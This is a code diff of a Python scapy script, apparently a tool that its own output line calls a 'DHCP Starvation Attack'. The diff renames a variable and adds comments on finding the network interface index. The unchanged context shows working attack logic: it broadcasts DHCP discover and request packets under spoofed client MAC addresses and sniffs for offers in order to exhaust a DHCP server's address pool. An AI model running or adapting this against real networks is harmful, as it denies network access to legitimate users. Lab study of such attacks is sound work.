@@ -6,6 +6,8 @@ from scapy.all import DHCP, BOOTP, IP, UDP, Ether, sniff, sendp, get_if_hwaddr, 
 
 INTERFACE_INDEX = 25  # --- Change this to the desired interface index ---
 
+# the interface can be found using the command "ip link show" in Linux, and the index is the number before the colon (e.g., "25: eth0").
+# the interface can be found in windows using the command "Get-NetIPInterface | Sort-Object InterfaceIndex | Format-Table InterfaceIndex, InterfaceAlias, AddressFamily".
 INTERFACE_NAME = None
 for iface in conf.ifaces.values():
     if getattr(iface, 'index', -1) == INTERFACE_INDEX:
@@ -16,7 +18,7 @@ if not INTERFACE_NAME:
     print(f"[!] Error: Interface with index {INTERFACE_INDEX} not found.")
     exit(1)
 
-MAC_REAL = get_if_hwaddr(INTERFACE_NAME)
+REAL_MAC = get_if_hwaddr(INTERFACE_NAME)
 SEND_RATE = 0.3  # Adjust rate in which the packets are sent, if needed
 active_dhcp_transactions = {}
 
@@ -34,7 +36,7 @@ def send_DHCP_discover(iface_name):
     active_dhcp_transactions[xid] = false_mac
     mac_false_bytes = bytes.fromhex(false_mac.replace(":", ""))
     
-    eth = Ether(src=MAC_REAL, dst="ff:ff:ff:ff:ff:ff")
+    eth = Ether(src=REAL_MAC, dst="ff:ff:ff:ff:ff:ff")
     ip = IP(src="0.0.0.0", dst="255.255.255.255")
     udp = UDP(sport=68, dport=67)
     
@@ -70,7 +72,7 @@ def process_packet(pkt):
         if message_type == 2:
             print(f"[+] Received OFFER -> IP: {offered_ip} for MAC: {false_mac}. Sending REQUEST...")
             
-            eth = Ether(src=MAC_REAL, dst="ff:ff:ff:ff:ff:ff")
+            eth = Ether(src=REAL_MAC, dst="ff:ff:ff:ff:ff:ff")
             ip = IP(src="0.0.0.0", dst="255.255.255.255")
             udp = UDP(sport=68, dport=67)
             
@@ -94,7 +96,7 @@ def process_packet(pkt):
 
 def main():
     print(f"Starting DHCP Starvation Attack on Interface: {INTERFACE_NAME}")
-    print(f"Origin MAC: {MAC_REAL}\n")
+    print(f"Origin MAC: {REAL_MAC}\n")
     
     from threading import Thread
     sniffer_thread = Thread(target=lambda: sniff(
